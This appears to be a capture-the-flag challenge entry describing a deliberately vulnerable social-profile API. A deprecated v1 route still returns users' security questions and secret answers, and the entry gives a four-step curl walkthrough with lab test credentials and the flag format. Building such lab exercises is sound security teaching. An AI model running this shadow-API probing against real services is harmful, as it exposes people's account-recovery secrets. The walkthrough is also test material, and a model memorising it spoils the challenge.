# api/shadow-version — ShadowVersion (resource-resident, medium)

**ProfileBook** social profiles. Current API v2 (`GET /api/v2/users/{username}/profile`) returns clean profiles — `secret_answer` was removed from v2 output entirely. The FORGOTTEN v1 route is still mounted: `GET /api/v1/users/{username}/profile?export=full` returns the legacy projection including `security_question` + `secret_answer`. The innocent user's secret answer holds the flag.

Why exploitable: deprecation without removal — old API versions keep their old (over-exposing) field sets as long as they stay routed, shadowing the fixed current version.

## Intended path
1. `curl -s -c jar -X POST -d 'username=0xnhsec&password=vlh-tester-01' http://victim.target.lab:8119/login`
2. Directory: `curl -s http://victim.target.lab:8119/api/v2/users` → note the `usr_…` account (role `innocent`).
3. v2 (clean): `curl -s -b jar http://victim.target.lab:8119/api/v2/users/usr_xxxx/profile` — no secret fields.
4. Legacy v1: `curl -s -b jar 'http://victim.target.lab:8119/api/v1/users/usr_xxxx/profile?export=full'` → `secret_answer` holds the flag.

**Flag:** `DSLTV{API-ShadowVersion-<9 digits>}` (in the innocent's secret answer — reachable only through the old route; v2 never exposes it).
